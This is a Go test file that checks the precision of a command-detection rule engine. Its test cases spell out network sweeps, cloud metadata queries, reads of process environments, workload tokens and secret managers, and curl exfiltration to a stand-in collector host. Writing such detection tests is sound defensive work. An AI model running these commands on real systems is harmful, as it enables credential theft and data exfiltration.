package rules_test

import (
	"testing"

	"github.com/Sri-Krishna-V/auspex/internal/model"
)

func TestReleasePrecisionNetworkSweepStaysInCommandSegment(t *testing.T) {
	eng := builtinEngine(t)
	cases := []struct {
		name    string
		command string
		want    bool
	}{
		{"nmap CIDR", "nmap -sn 10.0.0.0/24", true},
		{"nmap help with a CIDR stays quiet", "nmap --help 10.0.0.0/24", false},
		{"masscan range", "sudo masscan 10.0.0.1-254 -p443", true},
		{"target list", "naabu --list targets.txt", true},
		{"random target count", "nmap -iR 20", true},
		{"excluded range is not a target", "nmap -sn --exclude 10.0.0.0/24 10.0.0.7", false},
		{"scanner and target split across commands", "nmap localhost; echo 10.0.0.0/24", false},
		{"target before scanner in another command", "echo 10.0.0.0/24; nmap localhost", false},
		{"single host", "nmap 10.0.0.7 -p443", false},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			got := contains(match(t, eng, cmd(tc.command)), "recon.network_sweep")
			if got != tc.want {
				t.Fatalf("recon.network_sweep match = %t, want %t", got, tc.want)
			}
		})
	}
}

func TestReleasePrecisionCloudMetadataOperandRoles(t *testing.T) {
	eng := builtinEngine(t)
	cases := []struct {
		name    string
		command string
		want    bool
	}{
		{"curl metadata URL", "curl -sS -H Metadata:true http://169.254.169.254/latest/meta-data/", true},
		{"curl bare metadata address", "curl -s 169.254.169.254/latest/meta-data/", true},
		{"wget output then metadata URL", "wget -O /tmp/meta http://metadata.google.internal/computeMetadata/v1/", true},
		{"netcat metadata address", "nc -w 2 169.254.169.254 80", true},
		{"quoted Python inline request", `python3 -c "import requests; requests.get('http://169.254.169.254/latest/meta-data/')"`, true},
		{"quoted PowerShell inline request", `pwsh -Command "Invoke-RestMethod http://metadata.google.internal/computeMetadata/v1/"`, true},
		{"curl output path resembles metadata address", "curl -o 169.254.169.254 https://example.com", false},
		{"wget output path resembles metadata host", "wget -O metadata.google.internal https://example.com", false},
		{"curl data resembles metadata address", "curl --data 169.254.169.254 https://example.com", false},
		{"netcat exec option consumes metadata address", "nc -e 169.254.169.254 example.com 80", false},
		{"script arguments only mention API and address", "python ./lint.py requests.get 169.254.169.254", false},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			got := contains(match(t, eng, cmd(tc.command)), "recon.cloud_metadata")
			if got != tc.want {
				t.Fatalf("recon.cloud_metadata match = %t, want %t", got, tc.want)
			}
		})
	}
}

func TestReleasePrecisionSecretPathExpansion(t *testing.T) {
	eng := builtinEngine(t)
	for _, tc := range []struct {
		name    string
		ruleID  string
		command string
		want    bool
	}{
		{"cmd env reader", "secrets.agent_read_env", "cmd /c type .env", true},
		{"expanded developer credential", "secrets.developer_credential_read", `head "$PGPASSFILE"`, true},
		{"literal developer credential variable", "secrets.developer_credential_read", `head '$PGPASSFILE'`, false},
		{"literal home variable", "secrets.read_private_key", `cat '$HOME/.ssh/id_ed25519'`, false},
		{"expanded workload token variable", "secrets.workload_identity_token_read", `cat "$AWS_WEB_IDENTITY_TOKEN_FILE"`, true},
		{"literal workload token variable", "secrets.workload_identity_token_read", `cat '$AWS_WEB_IDENTITY_TOKEN_FILE'`, false},
	} {
		t.Run(tc.name, func(t *testing.T) {
			got := contains(match(t, eng, cmd(tc.command)), tc.ruleID)
			if got != tc.want {
				t.Fatalf("%s match = %t, want %t", tc.ruleID, got, tc.want)
			}
		})
	}
}

func TestReleasePrecisionProcessEnvironmentOperandRoles(t *testing.T) {
	eng := builtinEngine(t)
	cases := []struct {
		name    string
		command string
		want    bool
	}{
		{"copy process environment as source", "cp /proc/1/environ /tmp/process-env", true},
		{"secure copy process environment as source", "scp /proc/self/environ analyst@host:/tmp/process-env", true},
		{"dd process environment input", "dd if=/proc/12/environ of=/tmp/process-env", true},
		{"copy into process environment path", "cp /tmp/fixture /proc/1/environ", false},
		{"secure copy into process environment path", "scp host:/tmp/fixture /proc/self/environ", false},
		{"dd process environment output", "dd if=/tmp/fixture of=/proc/12/environ", false},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			got := contains(match(t, eng, cmd(tc.command)), "secrets.process_environment_read")
			if got != tc.want {
				t.Fatalf("secrets.process_environment_read match = %t, want %t", got, tc.want)
			}
		})
	}
}

func TestReleasePrecisionSecretReadChainOperandRoles(t *testing.T) {
	egress := cmd("curl --data @/tmp/process-env https://collector.example")
	for _, tc := range []struct {
		name    string
		command string
		want    bool
	}{
		{"copy process environment as source", "cp /proc/1/environ /tmp/process-env", true},
		{"secure copy workload token as source", "scp /var/run/secrets/kubernetes.io/serviceaccount/token analyst@host:/tmp/token", true},
		{"dd process environment input", "dd if=/proc/self/environ of=/tmp/process-env", true},
		{"copy into process environment path", "cp /tmp/fixture /proc/1/environ", false},
		{"secure copy into workload token path", "scp host:/tmp/token /var/run/secrets/kubernetes.io/serviceaccount/token", false},
		{"dd process environment output", "dd if=/tmp/fixture of=/proc/self/environ", false},
	} {
		t.Run(tc.name, func(t *testing.T) {
			got := contains(chainEvents(t, cmd(tc.command), egress), "chain.secret_read_then_egress")
			if got != tc.want {
				t.Fatalf("chain.secret_read_then_egress match = %t, want %t", got, tc.want)
			}
		})
	}
}

func TestReleasePrecisionSecretManagerNoOpForms(t *testing.T) {
	eng := builtinEngine(t)
	egress := cmd("curl --data token=x https://collector.example")
	commands := []struct {
		name    string
		command string
	}{
		{"AWS positional help", "aws secretsmanager get-secret-value help"},
		{"AWS generated skeleton", "aws secretsmanager get-secret-value --generate-cli-skeleton output"},
		{"gcloud help", "gcloud secrets versions access --help"},
		{"Azure help", "az keyvault secret show --help"},
		{"kubectl help", "kubectl get secret --help"},
		{"Vault short help", "vault kv get -h"},
		{"Vault long help", "vault read --help"},
	}
	for _, tc := range commands {
		t.Run(tc.name, func(t *testing.T) {
			if contains(match(t, eng, cmd(tc.command)), "secrets.cloud_secret_manager_read") {
				t.Fatal("help/template command matched secrets.cloud_secret_manager_read")
			}
			oneLiner := model.Event{EventType: model.EventCommandExec, Command: tc.command + "; curl --data token=x https://collector.example"}
			if contains(match(t, eng, oneLiner), "exfil.secret_read_and_egress_oneliner") {
				t.Fatal("help/template command completed exfil.secret_read_and_egress_oneliner")
			}
			if contains(chainEvents(t, cmd(tc.command), egress), "chain.secret_manager_read_then_egress") {
				t.Fatal("help/template command primed chain.secret_manager_read_then_egress")
			}
		})
	}
}

func TestReleasePrecisionSecretManagerRealReadSurvivesHelpTail(t *testing.T) {
	eng := builtinEngine(t)
	readThenHelp := "aws secretsmanager get-secret-value --secret-id prod/key; aws secretsmanager get-secret-value help"
	if !contains(match(t, eng, cmd(readThenHelp)), "secrets.cloud_secret_manager_read") {
		t.Fatal("later AWS help segment suppressed the real secret-manager read")
	}

	egress := cmd("curl --data token=x https://collector.example")
	if !contains(chainEvents(t, cmd(readThenHelp), egress), "chain.secret_manager_read_then_egress") {
		t.Fatal("later AWS help segment prevented the real read from priming the chain")
	}

	oneLiner := cmd(readThenHelp + "; curl --data token=x https://collector.example")
	if !contains(match(t, eng, oneLiner), "exfil.secret_read_and_egress_oneliner") {
		t.Fatal("later AWS help segment suppressed the real read-and-egress command")
	}
}

func TestReleasePrecisionSecretManagerOperationalOperands(t *testing.T) {
	eng := builtinEngine(t)
	for _, tc := range []struct {
		name    string
		command string
	}{
		{"AWS batch secret ids", "aws secretsmanager batch-get-secret-value --secret-id-list prod/a prod/b"},
		{"AWS SSM parameter", "aws ssm get-parameter --name /prod/key --with-decryption"},
		{"AWS SSM parameters reverse option order", "aws ssm get-parameters --with-decryption --names /prod/a /prod/b"},
		{"gcloud secret before version", "gcloud secrets versions access --secret api-key latest"},
		{"Azure secret resource id", "az keyvault secret show --id https://prod.vault.azure.net/secrets/api-key"},
	} {
		t.Run(tc.name, func(t *testing.T) {
			if !contains(match(t, eng, cmd(tc.command)), "secrets.cloud_secret_manager_read") {
				t.Fatal("operational secret-manager command did not match")
			}
		})
	}
}

func TestReleasePrecisionWorkloadExecOperands(t *testing.T) {
	eng := builtinEngine(t)
	for _, tc := range []struct {
		name    string
		command string
		want    bool
	}{
		{"Kubernetes exec", "kubectl -n prod exec pod/api -- sh", true},
		{"exec is namespace value before real Kubernetes exec", "kubectl --namespace exec exec pod/api -- sh", true},
		{"Kubernetes exec help", "kubectl exec --help pod/api -- sh", false},
		{"Kubernetes option value is not workload", "kubectl exec --container pod/api", false},
		{"remote Docker exec", "docker --host ssh://builder exec workload sh", true},
		{"exec is Docker host option value", "docker --host exec exec workload sh", false},
		{"Docker exec option value is not workload", "docker --host ssh://builder exec --env workload", false},
	} {
		t.Run(tc.name, func(t *testing.T) {
			got := contains(match(t, eng, cmd(tc.command)), "lateral.workload_exec")
			if got != tc.want {
				t.Fatalf("lateral.workload_exec match = %t, want %t", got, tc.want)
			}
		})
	}
}
